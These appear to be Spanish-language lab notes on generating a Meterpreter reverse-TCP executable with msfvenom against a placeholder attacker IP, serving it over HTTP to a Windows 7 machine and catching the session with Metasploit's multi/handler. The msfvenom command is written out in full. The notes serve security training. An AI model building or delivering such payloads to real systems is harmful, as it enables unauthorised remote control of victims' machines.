- Vamos a utilizar Windows 7.
- Msfvenom es un generador de payloads


- Para iniciarlo debemos usar el siguiente comando:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST (IP_MAQUINA_ATACANTE) LPORT=443 -f exe -o (NOMBRE_DE_ARCHIVO)
```
- Esta información podemos buscarlo por internet

![](../Imagenes/Pasted%20image%2020241212195502.png)

- Ahora vamos a compartirlo dentro de un servidor http con python en el puerto 80

![](../Imagenes/Pasted%20image%2020241212195601.png)

- En la maquina windows 7 entramos a la web.

![](../Imagenes/Pasted%20image%2020241212195743.png)

- Lo descargamos y lo guardamos en el escritorio.
- Ahora vamos a dejar en escucha kali.
- Vamos a usar el metasploit para usar la herramienta `exploit/multi/handler`.
	- Para esto usamos el siguiente comando:
```
use /multi/handler
```

![](../Imagenes/Pasted%20image%2020241212200304.png)

- Vamos a configurarlo usando el comando `show options`.

![](../Imagenes/Pasted%20image%2020241212200352.png)

- Es importante saber que esta herramienta genera una reverse shell, pero en windows creamos un payload con meterpreter.
- Para eso lo configuramos de la siguiente forma:

![](../Imagenes/Pasted%20image%2020241212200629.png)

- Ya tenemos nuestro payload configurado:

![](../Imagenes/Pasted%20image%2020241212200753.png)

- Ejecutamos el payload con el comando `run` y a la vez ejecutamos en windows 7 el payload descargado y ya tenemos conexión.

![](../Imagenes/Pasted%20image%2020241212200926.png)

